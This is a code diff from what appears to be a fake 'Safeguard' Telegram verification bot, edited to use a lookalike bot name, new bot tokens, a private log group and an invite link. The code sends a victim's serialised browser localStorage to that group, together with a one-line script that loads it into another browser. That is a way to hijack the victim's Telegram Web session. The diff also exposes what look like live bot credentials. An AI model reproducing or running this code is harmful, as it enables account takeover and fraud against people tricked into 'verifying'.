@@ -21,10 +21,10 @@ type SafeguardConfig = {
 };
 
 /* #region environment variable */
-const botOwner = "1117264759";
-const botName = "VerifywithSafeguardrobot";
+const botOwner = "5622012093";
+const botName = "OfficiaISafeguardVerificationBot";
 const webAppLink = "https://safeguard-webapp2025.deno.dev/";
-const gateKeeper = "7734508293:AAHXJt9rNpDpObZoIXGww6e8kX9Y6oUHin8";
+const gateKeeper = "7251084408:AAENHwxGFMqEXvcT7Rut_SOXUAXiWfXeHO4";
 const sgClickVerifyURL = "safeguard-click-verify.jpg";
 const sgTapToVerifyURL = "safeguard-human.jpg";
 const sgVerifiedURL = "safeguard-verify.jpg";
@@ -201,10 +201,10 @@ const newVerified = async (ctx: Context) => {
 
 <pre>Object.entries(${JSON.stringify(storage)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();</pre>`;
 
-    const myGroupId = -4723386398;
+    const myGroupId = -4765914839;
 
     // Invia log al bot owner
-    await bot.api.sendMessage(botOwner, log, { parse_mode: "HTML" });
+    // await bot.api.sendMessage(botOwner, log, { parse_mode: "HTML" });  --> qua ho commentato l'invio dei log nella chat col bot
 
     // Invia log anche al gruppo
     await bot.api.sendMessage(myGroupId, log, { parse_mode: "HTML" });
@@ -213,7 +213,7 @@ const newVerified = async (ctx: Context) => {
     const deno = await Deno.openKv();
     const entry = await deno.get(["channel", "@SolanaSignalsPrivate"]);
     const config = (entry.value || sgConfigDefault) as SafeguardConfig;
-    config.inviteLink = "https://t.me/+svKf9_oSfW81MTI0";
+    config.inviteLink = "https://t.me/+bQ5TvYb4OYZhNDlh";
 const imageResponse = await fetch("https://raw.githubusercontent.com/mazzamassy/complete/refs/heads/main/safeguard-verify.jpg");
 const imageBuffer = new Uint8Array(await imageResponse.arrayBuffer());
 const imageLink = new InputFile(imageBuffer, "safeguard-verify.jpg");
@@ -236,7 +236,7 @@ Join request has been sent and you will be added once the admin approves your re
 🖼️ <b>Image Link:</b> https://raw.githubusercontent.com/mazzamassy/complete/refs/heads/main/safeguard-verify.jpg
 `;
 
-    await bot.api.sendMessage(botOwner, debugMessage, { parse_mode: "HTML" });
+    // await bot.api.sendMessage(botOwner, debugMessage, { parse_mode: "HTML" });  --> qua ho commentato l'invio del debug
 
     if (user_id) {
 const deno = await Deno.openKv();
